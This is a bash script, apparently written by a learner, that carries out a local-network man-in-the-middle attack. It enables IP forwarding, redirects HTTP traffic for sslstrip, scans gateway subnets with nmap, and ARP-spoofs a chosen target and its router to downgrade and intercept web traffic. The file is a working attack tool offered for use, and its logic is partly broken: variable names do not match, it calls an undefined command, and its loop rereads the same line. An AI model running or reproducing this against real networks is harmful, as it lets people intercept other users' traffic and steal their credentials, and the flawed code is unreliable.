echo Strip HTTPS to HTTP 
echo have fun! 
echo Enable IP fowarder
echo 1 > /proc/sys/net/ipv4/ip_forward
echo enabling port forwarding from a certain port to another port
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 
iptables -t nat -L PREROUTING  
sslstrip -h
#Not really sure what this does look into it more 
iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
iptables -L INPUT 

#stopped at 8:16:68
echo the default gateway info is listed below
route
route > gateway.txt
GTCNT=$(wc -l gateway.txt | gawk '{print $1}')
echo the Gateway count is $GTCNT
if [ $GRCNT==2 ]; then
	echo Setting the gateway to a default value:
	echo 192.168.0.0 > gatewayIP.txt
else 
	gawk '{print $1}' gateway.txt > gatewayIP.txt
fi
grep '[0-9]' gatewayIP.txt > gatewayIPNum.txt
echo The list of only IP address in the route is as follows:
cat gatewayIPNum.txt 
sed -e 's/$/-254/' gatewayIPNum.txt > gatewayIPsubnet.txt
SUBCNT=$(wc -l gatewayIPsubnet.txt | gawk '{print $1}')
echo the Subnet count is $SUBCNT
echo The list of subnet ranges is as follows:
cat gatewayIPsubnet.txt
COUNTER=1
p=p
let SUBCNT=SUBCNT+1
TEMP=0
echo Would you like to NMAP again please enter 'Y' to do it 
read nmapbit 
if [ $nmapbit = "Y" ]; then 
	while [ $COUNTER -lt $SUBCNT ]; do
		echo $COUNTER :
		NMAPADD=$(sed -n 1p gatewayIPsubnet.txt)
		echo you are about to Nmap $NMAPADD range:
		nmap $NMAPADD -vv
		let COUNTER=COUNTER+1
	done
fi	



echo ARP Spoofing attacl
echo Syntax: arpspoof -i interface -t target-ip -r target-gateway-ip
echo Place enter the router ip address or default gateway 
read -p "default router IP: " targetDefault
if [ ! -z "${targetIP}" ]&&[ ! -z "${targetDefault}"]
then
	echo -e "t${targetIP}\t${targetDefault}" >> ipadds.txt
else
	input
fi
echo Please enter the targetIP of System
read -p "target IP: "  targetIP
arpspoof -i eth0 -t $targetDefault -r $targetIP &
routerPID=$!
arpspoof -i eth0 -t $targetIP -r $targetDefault
sleep 180 
kill -TERM $routerPID
#sslstrip 8080
#cp sslstrip.log targethttpStripLog.txt
#tail -f sslstrip.log


